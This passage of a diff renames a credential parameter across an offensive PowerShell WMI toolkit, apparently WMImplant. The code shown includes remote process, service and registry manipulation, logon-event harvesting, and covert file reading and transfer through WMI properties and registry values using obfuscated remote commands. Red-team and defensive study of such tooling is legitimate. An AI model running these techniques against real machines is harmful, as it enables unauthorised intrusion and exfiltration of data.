+                    Invoke-RegValueMod -Credential $Credential -ComputerName $ComputerName
                 }
                 else
                 {
@@ -2837,7 +2837,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-RemoteScriptWithOutput -Creds $Credential -ComputerName $ComputerName
+                    Invoke-RemoteScriptWithOutput -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2850,7 +2850,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Invoke-ServiceMod -Creds $Credential -ComputerName $ComputerName
+                    Invoke-ServiceMod -Credential $Credential -ComputerName $ComputerName
                 }
                 else
                 {
@@ -2862,7 +2862,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-ProcessPunisher -Creds $Credential -ComputerName $ComputerName
+                    Invoke-ProcessPunisher -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2875,7 +2875,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-ProcSpawn -Creds $Credential -ComputerName $ComputerName
+                    Invoke-ProcSpawn -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2888,7 +2888,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Get-ProcessListingWMImplant -Creds $Credential -ComputerName $ComputerName
+                    Get-ProcessListingWMImplant -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2901,7 +2901,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Find-CurrentUsers -Creds $Credential -ComputerName $ComputerName
+                    Find-CurrentUsers -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2914,7 +2914,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Get-HostInfo -Creds $Credential -ComputerName $ComputerName
+                    Get-HostInfo -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2927,7 +2927,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Get-ComputerDrives -Creds $Credential -ComputerName $ComputerName
+                    Get-ComputerDrives -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2940,7 +2940,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Get-NetworkCards -Creds $Credential -ComputerName $ComputerName
+                    Get-NetworkCards -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2953,7 +2953,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Get-InstalledPrograms -Creds $Credential -ComputerName $ComputerName
+                    Get-InstalledPrograms -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2974,7 +2974,7 @@ function Use-MenuSelection
 
                     if($Credential)
                     {
-                        Get-WMIEventLogins -Creds $Credential -FileName $FileSavePath -ComputerName $ComputerName
+                        Get-WMIEventLogins -Credential $Credential -FileName $FileSavePath -ComputerName $ComputerName
                     }
 
                     else
@@ -2987,7 +2987,7 @@ function Use-MenuSelection
                 {
                     if($Credential)
                     {
-                        Get-WMIEventLogins -Creds $Credential -ComputerName $ComputerName
+                        Get-WMIEventLogins -Credential $Credential -ComputerName $ComputerName
                     }
 
                     else
@@ -3001,7 +3001,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $Credential -Logoff -ComputerName $ComputerName
+                    Invoke-PowerOptionsWMI -Credential $Credential -Logoff -ComputerName $ComputerName
                 }
 
                 else
@@ -3014,7 +3014,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $Credential -Reboot -ComputerName $ComputerName
+                    Invoke-PowerOptionsWMI -Credential $Credential -Reboot -ComputerName $ComputerName
                 }
 
                 else
@@ -3027,7 +3027,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $Credential -Shutdown -ComputerName $ComputerName
+                    Invoke-PowerOptionsWMI -Credential $Credential -Shutdown -ComputerName $ComputerName
                 }
 
                 else
@@ -3040,7 +3040,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Find-VacantComputer -Creds $Credential -ComputerName $ComputerName
+                    Find-VacantComputer -Credential $Credential -ComputerName $ComputerName
                 }
                 else
                 {
@@ -3063,7 +3063,7 @@ function Find-FileWMImplant
     param
     (
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)]
@@ -3199,9 +3199,9 @@ function Find-FileWMImplant
 
         $filter += "AND Drive='$Drive'"
 
-        if($Creds)
+        if($Credential)
         {
-            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName -Credential $Creds
+            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName -Credential $Credential
         }
         else
         {
@@ -3216,7 +3216,7 @@ function Get-FileContentsWMImplant
     param
     (
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)]
@@ -3232,9 +3232,9 @@ function Get-FileContentsWMImplant
         }
 
         # Keep original WMI Property Value
-        if($Creds)
+        if($Credential)
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
         }
         else
         {
@@ -3245,9 +3245,9 @@ function Get-FileContentsWMImplant
         Write-Verbose "Reading remote file and writing to WMI property"
         $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'
 
-        if($Creds)
+        if($Credential)
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $creds -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
         }
         else
         {
@@ -3260,9 +3260,9 @@ function Get-FileContentsWMImplant
         while($quit -eq $false)
         {
             Write-Verbose "Polling property to see if the script has completed"
-            if($Creds)
+            if($Credential)
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
             }
             else
             {
@@ -3310,7 +3310,7 @@ function Invoke-FileTransferWMImplant
     param
     (
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False,ParameterSetName='download')]
@@ -3369,9 +3369,9 @@ function Invoke-FileTransferWMImplant
             Write-Verbose "Reading remote file and writing on remote registry"
             $remote_command = '$fct = Get-Content -Encoding byte -ReadCount 0 -Path ''' + "$Download_file" + '''; $fctenc = [Int[]][byte[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
 
-            if($Creds)
+            if($Credential)
             {
-                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $Creds -ObfuscateWithEnvVar
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
             }
             else
             {
@@ -3384,9 +3384,9 @@ function Invoke-FileTransferWMImplant
             $quit = $false
             while($quit -eq $false)
             {
-                if($Creds)
+                if($Credential)
                 {
-                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Creds
+                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Credential
                 }
                 else
                 {
@@ -3410,9 +3410,9 @@ function Invoke-FileTransferWMImplant
             # Removing Registry value from remote system
             Write-Verbose "Removing registry value from remote system"
 
-            if($Creds)
+            if($Credential)
             {
-                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Creds
+                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Credential
             }
             else
             {
@@ -3450,9 +3450,9 @@ function Invoke-FileTransferWMImplant
             $filecontentencoded = [Int[]][byte[]]$filecontents -Join ','
 
             Write-Verbose "Writing encoded file to remote registry"
-            if($Creds)
+            if($Credential)
             {
-                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName -Credential $Creds
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName -Credential $Credential
             }
             else
             {
@@ -3462,9 +3462,9 @@ function Invoke-FileTransferWMImplant
             # grabs registry value and saves to disk
             Write-Verbose "Connecting to $ComputerName"
             $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [byte[]][int[]]$out.sValue.Split('','') -Join '' ''; [byte[]] $decoded = $decode -split '' ''; Set-Content -Encoding byte -Path ' + "$Upload_Dir" + ' -Value $decoded; Remove-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registryupname'"
-            if($Creds)
+            if($Credential)
             {
-                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $creds -ObfuscateWithEnvVar
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
             }
             else
             {
@@ -3484,7 +3484,7 @@ function Invoke-LSWMImplant
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
@@ -3509,10 +3509,10 @@ function Invoke-LSWMImplant
         Write-Verbose "Connecting to $ComputerName"
         $filter = "Drive='$Drive' and Path='$DirPath'"
 
-        if($Creds)
+        if($Credential)
         {
-            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName -Credential $Creds
-            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName -Credential $Creds
+            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName -Credential $Credential
+            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName -Credential $Credential
         }
         else
         {
@@ -3530,7 +3530,7 @@ function Set-OriginalProperty
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName
     )
